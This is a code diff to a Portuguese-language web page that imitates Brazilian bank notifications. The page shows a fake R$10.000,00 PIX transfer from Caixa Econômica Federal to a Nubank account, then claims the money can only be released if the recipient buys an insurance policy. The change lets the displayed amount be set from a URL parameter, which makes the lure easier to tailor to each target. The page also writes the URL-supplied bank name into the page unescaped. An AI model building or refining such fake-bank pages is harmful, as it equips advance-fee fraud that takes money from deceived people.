@@ -402,14 +402,14 @@
                     </div>
                     <span class="text-gray-700 text-sm" id="bankName1">Nubank • agora <i class="fas fa-chevron-down text-xs"></i></span>
                 </div>
-                <div class="text-black text-lg font-bold mb-0">PIX no valor de R$10.000,00</div>
+                <div class="text-black text-lg font-bold mb-0">PIX no valor de <span class="dynamic-amount">R$10.000,00</span></div>
             </div>
             <div class="w-12 h-12 flex-shrink-0 overflow-hidden rounded-[10px]">
                 <img src="https://logodownload.org/wp-content/uploads/2019/08/nubank-logo-2.png" alt="Bank logo" class="w-full h-full object-cover bank-image">
             </div>
         </div>
         <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
-            CAIXA ECONÔMICA FEDERAL deseja transferir R$10.000,00 para sua conta <span id="bankText1">Nubank</span>. Você deseja aceitar?
+            CAIXA ECONÔMICA FEDERAL deseja transferir <span class="dynamic-amount">R$10.000,00</span> para sua conta <span id="bankText1">Nubank</span>. Você deseja aceitar?
         </div>
         <div class="flex justify-end mt-3 space-x-2" style="margin-right: 5px;">
             <button id="acceptButton" class="bg-green-500 text-white text-sm px-6 py-2 rounded-lg hover:bg-green-600 transition duration-200 button-text-shadow button-shadow flex-grow">Aceitar</button>
@@ -437,7 +437,7 @@
             </div>
         </div>
         <div class="text-gray-600 text-sm w-full mt-0.5" style="word-break: break-word;">
-            Não foi possível concluir o recebimento de R$10.000,00 via PIX. A Caixa Econômica Federal exige a contratação do seguro Prestamista para liberar o valor. Realize a contratação do seguro e receberemos a transferência.
+            Não foi possível concluir o recebimento de <span class="dynamic-amount">R$10.000,00</span> via PIX. A Caixa Econômica Federal exige a contratação do seguro Prestamista para liberar o valor. Realize a contratação do seguro e receberemos a transferência.
         </div>
     </div>
     <div class="header">
@@ -622,10 +622,20 @@
             return bankImages[bank] || bankImages['Nubank'];
         }
 
-        // Obtém o nome do banco e a imagem
+        // Obtém os parâmetros da URL
         const urlParams = new URLSearchParams(window.location.search);
         const bankName = urlParams.get('bank') || 'Nubank';
+        const amountValue = urlParams.get('amount') || '10000';
         const bankImage = getBankImage();
+        
+        // Formata o valor para exibição (adiciona R$ e formata com pontos e vírgulas)
+        const formatCurrency = (value) => {
+            // Converte para número e formata com 2 casas decimais
+            const numValue = parseFloat(value);
+            return 'R$' + numValue.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        };
+        
+        const formattedAmount = formatCurrency(amountValue);
         
         // Aplica a imagem do banco nas notificações
         const bankImages = document.querySelectorAll('.bank-image');
@@ -637,6 +647,11 @@
         document.getElementById('bankName1').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
         document.getElementById('bankName2').innerHTML = bankName + ' • agora <i class="fas fa-chevron-down text-xs"></i>';
         document.getElementById('bankText1').textContent = bankName;
+        
+        // Atualiza os valores monetários no texto
+        document.querySelectorAll('.dynamic-amount').forEach(el => {
+            el.textContent = formattedAmount;
+        });
 
         const notification1 = document.getElementById('notification1');
         const notification2 = document.getElementById('notification2');
